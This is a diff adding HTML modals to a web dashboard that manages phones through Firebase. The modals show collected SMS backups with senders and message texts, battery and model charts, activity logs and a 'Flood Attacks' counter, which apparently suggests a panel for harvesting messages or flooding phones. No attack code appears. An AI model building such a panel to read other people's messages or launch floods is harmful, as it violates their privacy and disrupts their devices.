+                    <i class="fas fa-trash mr-2"></i>Trash
+                </h2>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs">
+                        <thead class="bg-gray-800">
+                            <tr>
+                                <th class="px-2 py-2 text-left">Device</th>
+                                <th class="px-2 py-2 text-left">Model</th>
+                                <th class="px-2 py-2 text-left">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="trash-table"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Stats Modal -->
+        <div id="stats-modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeStatsModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-purple-400 mb-4">
+                    <i class="fas fa-chart-bar mr-2"></i>Firebase Statistics
+                </h2>
+                <div
+                    id="stats-content"
+                    class="grid grid-cols-1 md:grid-cols-2 gap-4"
+                ></div>
+            </div>
+        </div>
+
+        <!-- Backup Modal -->
+        <div id="backup-modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeBackupModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-green-400 mb-4">
+                    <i class="fas fa-database mr-2"></i>SMS Backups
+                </h2>
+                <div class="mb-3">
+                    <input
+                        type="text"
+                        id="backup-search"
+                        placeholder="Search device name or ID..."
+                        class="w-full bg-gray-800 text-white px-3 py-2 rounded border border-green-600 text-sm"
+                        oninput="filterBackups()"
+                    />
+                </div>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs">
+                        <thead class="bg-gray-800">
+                            <tr>
+                                <th class="px-2 py-2 text-left">Device</th>
+                                <th class="px-2 py-2 text-left hide-mobile">Device ID</th>
+                                <th class="px-2 py-2 text-left">Messages</th>
+                                <th class="px-2 py-2 text-left hide-mobile">Backup Time</th>
+                                <th class="px-2 py-2 text-left">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="backup-table"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Backup View Modal -->
+        <div id="backup-view-modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeBackupViewModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-green-400 mb-4">
+                    <i class="fas fa-envelope mr-2"></i><span id="backup-device-name">Backup</span>
+                </h2>
+                <div class="text-sm text-gray-400 mb-3" id="backup-message-count">
+                    0 messages
+                </div>
+                <div class="overflow-x-auto max-h-96 overflow-y-auto">
+                    <table class="w-full text-xs">
+                        <thead class="bg-gray-800 sticky top-0">
+                            <tr>
+                                <th class="px-2 py-1 text-left">Sender</th>
+                                <th class="px-2 py-1 text-left">Message</th>
+                                <th class="px-2 py-1 text-left">Time</th>
+                            </tr>
+                        </thead>
+                        <tbody id="backup-messages-table"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Analytics Modal -->
+        <div id="analytics-modal" class="modal">
+            <div class="modal-content" style="max-width: 1200px;">
+                <span class="close" onclick="closeAnalyticsModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-pink-400 mb-4">
+                    <i class="fas fa-chart-line mr-2"></i>Analytics & Charts
+                </h2>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
+                    <div class="bg-gray-900 p-4 rounded">
+                        <h3 class="text-sm font-bold text-pink-300 mb-3">Device Status Distribution</h3>
+                        <canvas id="deviceStatusChart"></canvas>
+                    </div>
+                    <div class="bg-gray-900 p-4 rounded">
+                        <h3 class="text-sm font-bold text-pink-300 mb-3">SMS Activity (Last 7 Days)</h3>
+                        <canvas id="smsActivityChart"></canvas>
+                    </div>
+                    <div class="bg-gray-900 p-4 rounded">
+                        <h3 class="text-sm font-bold text-pink-300 mb-3">Battery Levels</h3>
+                        <canvas id="batteryChart"></canvas>
+                    </div>
+                    <div class="bg-gray-900 p-4 rounded">
+                        <h3 class="text-sm font-bold text-pink-300 mb-3">Device Models</h3>
+                        <canvas id="modelChart"></canvas>
+                    </div>
+                </div>
+                <div class="grid grid-cols-2 md:grid-cols-4 gap-3">
+                    <div class="bg-gradient-to-br from-blue-900 to-blue-700 p-3 rounded text-center">
+                        <div class="text-2xl font-bold" id="avg-battery">--%</div>
+                        <div class="text-xs text-gray-300">Avg Battery</div>
+                    </div>
+                    <div class="bg-gradient-to-br from-green-900 to-green-700 p-3 rounded text-center">
+                        <div class="text-2xl font-bold" id="total-messages-stat">0</div>
+                        <div class="text-xs text-gray-300">Total SMS</div>
+                    </div>
+                    <div class="bg-gradient-to-br from-purple-900 to-purple-700 p-3 rounded text-center">
+                        <div class="text-2xl font-bold" id="uptime-percent">--%</div>
+                        <div class="text-xs text-gray-300">Uptime</div>
+                    </div>
+                    <div class="bg-gradient-to-br from-red-900 to-red-700 p-3 rounded text-center">
+                        <div class="text-2xl font-bold" id="flood-total">0</div>
+                        <div class="text-xs text-gray-300">Flood Attacks</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Activity Logs Modal -->
+        <div id="activity-logs-modal" class="modal">
+            <div class="modal-content">
+                <span class="close" onclick="closeActivityLogsModal()">&times;</span>
+                <h2 class="text-xl md:text-2xl font-bold text-cyan-400 mb-4">
+                    <i class="fas fa-history mr-2"></i>Activity Logs
+                </h2>
+                <div class="flex justify-between items-center mb-3">
+                    <input
+                        type="text"
+                        id="log-search"
+                        placeholder="Search logs..."
+                        class="bg-gray-800 text-white px-3 py-2 rounded border border-cyan-600 text-sm flex-1 mr-2"
+                        oninput="filterLogs()"
+                    />
+                    <button onclick="clearLogs()" class="bg-red-600 hover:bg-red-700 px-3 py-2 rounded text-xs">
+                        <i class="fas fa-trash mr-1"></i>Clear
+                    </button>
+                </div>
+                <div class="bg-gray-900 rounded p-3 max-h-96 overflow-y-auto" id="activity-logs-container">
+                    <div class="text-xs text-gray-400 text-center py-4">No activity logs yet</div>
+                </div>
+            </div>
+        </div>
+
+        <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
+        <script src="script.js?v=20251028-3"></script>
+    </body>
+</html>
